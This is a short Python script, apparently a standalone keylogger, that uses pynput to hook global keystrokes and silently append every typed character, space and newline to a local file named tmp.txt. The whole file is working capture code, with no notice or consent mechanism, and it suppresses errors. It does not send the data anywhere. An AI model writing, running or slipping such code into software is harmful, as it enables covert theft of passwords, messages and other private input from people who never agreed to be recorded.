from pynput import keyboard

TMP_FILE = "tmp.txt"

class Listener:
    def __init__(self):
        self.listener = keyboard.Listener(on_press=self.on_press)
        self.listener.daemon = True
    def on_press(self, key):
        try:
            char = key.char
        except:
            if key == keyboard.Key.space:
                char = " "
            elif key == keyboard.Key.enter:
                char = "\n"
        try:
            with open(TMP_FILE, "a", encoding="utf-8") as f:
                f.write(char)
        except:
            pass
    def start(self):
        self.listener.start()
        self.listener.join()

if __name__ == '__main__':
    Listener().start()
